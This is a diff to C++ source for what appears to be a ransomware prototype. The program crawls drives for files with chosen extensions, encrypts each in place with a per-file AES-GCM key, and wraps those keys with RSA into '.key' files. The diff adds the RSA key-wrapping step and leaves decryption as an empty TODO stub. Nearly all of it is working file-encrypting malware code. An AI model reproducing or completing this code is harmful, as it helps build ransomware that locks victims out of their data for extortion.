@@ -60,7 +60,17 @@ void path_producer_thread(p_producer_bundle& p_bundle);
 void path_consumer_thread(p_cons_k_prod_bundle& pk_bundle);
 void key_consumer_thread(k_consumer_bundle& k_bundle);
 
+void do_encryption();
+void do_decryption();
+
 int main(int argc, char* argv[]) {
+	do_encryption();
+
+	system("pause");
+	return 0;
+}
+
+void do_encryption() {
 	/* Stores path of files for encryption */
 	moodycamel::ConcurrentQueue<wstring> path_queue;
 	moodycamel::ProducerToken path_prod_tok(path_queue);
@@ -91,8 +101,8 @@ int main(int argc, char* argv[]) {
 	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
 	path_producer = thread(bind(&path_producer_thread, ref(path_producer_bundle)));
 
-	/* 
-	Start path consumer thread and empty path queue 
+	/*
+	Start path consumer thread and empty path queue
 	This thread also fills key_queue so we can encrypt aes keys with rsa
 	*/
 	p_consumer_bundle path_consumer_bundle = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count };
@@ -112,9 +122,10 @@ int main(int argc, char* argv[]) {
 		path_consumers[i].join();
 	}
 	rsa_thread.join();
+}
 
-	system("pause");
-	return 0;
+void do_decryption() {
+	// TODO
 }
 
 set<wstring>* get_wanted_extentions() {
@@ -211,7 +222,7 @@ void path_producer_thread(p_producer_bundle& p_bundle) {
 	moodycamel::ProducerToken& ptok = p_bundle.p;
 	atomic<int>& flag = p_bundle.flag;
 
-	// Testing
+	// For testing
 	drives = new vector<wstring>();
 	drives->push_back(L"C:\\test");
 
@@ -228,7 +239,6 @@ void path_producer_thread(p_producer_bundle& p_bundle) {
 						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
 							// Don't iterate further into folder
 							dir.no_push();
-							// cout << "Excluding -> " << dir->path() << endl;
 							break;
 						}
 					}
@@ -237,7 +247,6 @@ void path_producer_thread(p_producer_bundle& p_bundle) {
 				if (is_regular_file(dir->path())) {
 					// Only gather files with particular extentions
 					if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
-						wprintf(L"PRODUCER 1 - Queueing %s \n", &(dir->path().wstring())[0]);
 						queue.enqueue(ptok, dir->path().wstring());
 					}
 				}
@@ -284,6 +293,7 @@ void path_consumer_thread(p_cons_k_prod_bundle& pk_bundle) {
 	do {
 		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
 		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
+			wprintf(L"Encrypting %s\n", &path_str[0]);
 			items_left = true;
 
 			AESCrypto aes = AESCrypto();
@@ -291,10 +301,8 @@ void path_consumer_thread(p_cons_k_prod_bundle& pk_bundle) {
 			// Save key for key queue (k_queue), will delete ref in key_consumer_thread
 			unsigned char * aes_key_and_tag = new unsigned char[32+16]();	// 256 bit key + 128 bit tag
 			
-			aes.get_aes_key(aes_key_and_tag); // key -> first 32, tag -> last 16
-			aes.in_place_encrypt(path_str, aes_key_and_tag + 32);
-
-			
+			aes.get_aes_key(aes_key_and_tag); // Fill first 32 bytes with aes key
+			aes.in_place_encrypt(path_str, aes_key_and_tag + 32); // Fill last 16 bytes with gcm tag
 
 			k_queue.enqueue(k_ptok, make_tuple(path_str, aes_key_and_tag));
 		}
@@ -311,7 +319,7 @@ void key_consumer_thread(k_consumer_bundle& k_bundle) {
 	const int& k_producer_count = k_bundle.producer_count;
 	const int& k_consumer_count = k_bundle.consumer_count;
 
-	RSACrypto rsa = RSACrypto();	// 
+	RSACrypto rsa = RSACrypto();	
 
 	tuple<wstring, unsigned char *> path_key_tag;
 	wstring path;
@@ -322,7 +330,9 @@ void key_consumer_thread(k_consumer_bundle& k_bundle) {
 		while (k_queue.try_dequeue_from_producer(k_ptok, path_key_tag)) {
 			path = get<0>(path_key_tag);
 			aes_key_and_tag = get<1>(path_key_tag);
-			// DO RSA ENCRYPT ON AES KEY
+			
+			path = path + L".key";
+			rsa.encrypt_key(path, aes_key_and_tag, 32+16);
 		}
 	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);
 }
